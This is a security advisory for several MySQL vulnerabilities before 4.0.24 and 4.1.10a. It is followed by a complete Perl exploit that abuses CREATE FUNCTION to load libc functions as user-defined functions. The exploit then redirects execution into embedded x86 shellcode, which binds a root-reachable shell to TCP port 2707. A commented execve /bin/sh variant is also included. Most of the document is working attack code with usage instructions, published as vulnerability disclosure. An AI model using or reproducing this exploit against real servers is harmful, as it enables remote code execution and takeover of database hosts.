source: http://www.securityfocus.com/bid/12781/info

MySQL is reported prone to multiple vulnerabilities that can be exploited by a remote authenticated attacker. The following individual issues are reported:

- Insecure temporary file-creation vulnerability. Reports indicate that an attacker with 'CREATE TEMPORARY TABLE' privileges on an affected installation may leverage this vulnerability to corrupt files with the privileges of the MySQL process.

- Input-validation vulnerability. Remote attackers with INSERT and DELETE privileges on the 'mysql' administrative database can exploit this. Reports indicate that this issue may be leveraged to load and execute a malicious library in the context of the MySQL process.

- Remote arbitrary-code execution vulnerability. Reportedly, the vulnerability may be triggered by employing the 'CREATE FUNCTION' statement to manipulate functions to control sensitive data structures. This issue may be exploited to execute arbitrary code in the context of the database process.

These issues are reported to exist in MySQL versions prior to MySQL 4.0.24 and 4.1.10a. 

#!/usr/bin/perl
##   Mysql CREATE FUNCTION libc arbitrary code execution.
##
##   Author: Stefano Di Paola
##   Vulnerable: Mysql <= 4.0.23, 4.1.10 
##   Type of Vulnerability: Local/Remote - input validation
##   Tested On : Mandrake 10.1 /Debian Sarge
##   Vendor Status: Notified on March 2005
##   
##  Copyright 2005 Stefano Di Paola (stefano.dipaola@wisec.it)
##
##
##  Disclaimer:
##   In no event shall the author be liable for any damages
##   whatsoever arising out of or in connection with the use
##   or spread of this information.
##   Any use of this information is at the user's own risk.
##
##  
##  
##  It calls on_exit(address) 
##  then overwrites the address with strcat or strcpy
##  and then calls exit
##  
##  Usage:  
##          perl myexp.pl numberofnops offset
##  Example:
##          perl myexp.pl 3 0
################################################

use strict;
use DBI();
use Data::Dumper;
use constant DEBUG => 0;
use constant PASS => "USEYOURPASSHERE";
# Connect to the database.
my $dbh = DBI->connect("DBI:mysql:database=test;host=localhost",
		       "root", PASS ,{'RaiseError' => 1});
		       
### This is the opcode pointed by the address where on_exit jumps
###
### 
### 0x3deb jmp 0x3d
### but needs to be decremented by 2. ("shell",0x0x3de9,0)
##                                       -1            -1 = 0x3de9-2
# resulting in 0x3deb
## 0x3d is the distance from the address on_exit calls and the beginning of
## bind shell "\x6a\x66\x58\x6a\x01....
my $jmp=0x3de9+($ARGV[1]<<8);
printf("Using %x\n",$jmp); 
my $zeros="0,"x($jmp);
### Bind_shell... works.....but maybe needs some nop  \x90
### so i use argv[0] to repeat \x90
### It binds a shell to port 2707 (\x0a\x93)
 my $shell= ("\x90"x$ARGV[0])."\x6a\x66\x58\x6a\x01".
 "\x5b\x99\x52\x53\x6a\x02\x89".
 "\xe1\xcd\x80\x52\x43\x68\xff\x02\x0a\x93\x89\xe1".
 "\x6a\x10\x51\x50\x89\xe1\x89\xc6\xb0\x66\xcd\x80".
 "\x43\x43\xb0\x66\xcd\x80\x52\x56\x89\xe1\x43\xb0".
 "\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80".
 "\x41\xe2\xf8\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f".
 "\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

########### Bash !!!!!!!!!!!###############
#   my $shell=("\x90"x$ARGV[0])."\x6a\x0b\x58\x99\x52\x68".
#  "\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80";
my $onex_create="create function on_exit returns integer soname 'libc.so.6';";
print $onex_create,"\n" if(DEBUG);
my $sth = $dbh->prepare($onex_create);
if (!$sth) {
    print "Error:" . $dbh->errstr . "\n";
}
eval {$sth->execute};
  if($@){
     print "Error:" . $sth->errstr . "\n";
  }


my $strcat_create="create function strcat returns string soname 'libc.so.6';";
print $strcat_create,"\n" if(DEBUG);
my $sth = $dbh->prepare($strcat_create);
if (!$sth) {
    print "Error:" . $dbh->errstr . "\n";
}
eval {$sth->execute};
  if($@){
     print "Error:" . $sth->errstr . "\n";
  }

my $exit_create="create function exit returns integer soname 'libc.so.6';";
print $exit_create,"\n" if(DEBUG);
my $sth = $dbh->prepare($exit_create);
if (!$sth) {
    print "Error:" . $dbh->errstr . "\n";
}
eval {$sth->execute};
  if($@){
     print "Error:" . $sth->errstr . "\n";
  }

my $onex="select    on_exit('".$shell."',".$zeros."0),   strcat(0);";
 print "select    on_exit('".$shell."', 0),   strcat(0);";
print $onex,"\n" if(DEBUG);
my $sth = $dbh->prepare($onex);
if (!$sth) {
    print "Error:" . $dbh->errstr . "\n";
}
print "Select on_exit\n";

if (!$sth->execute) {
    print "Error:" . $sth->errstr . "\n";
}
   while (my $ref = $sth->fetchrow_hashref()) {
      print Dumper($ref);
    }


my $strc="select    strcat('".$shell."',".$zeros."0),     exit(0);";
print $strc,"\n" if(DEBUG);
 $sth = $dbh->prepare($strc);
if (!$sth) {
    print "Error:" . $dbh->errstr . "\n";
}

if (!$sth->execute) {
    print "Error:" . $sth->errstr . "\n";
}
print "Select exit\n";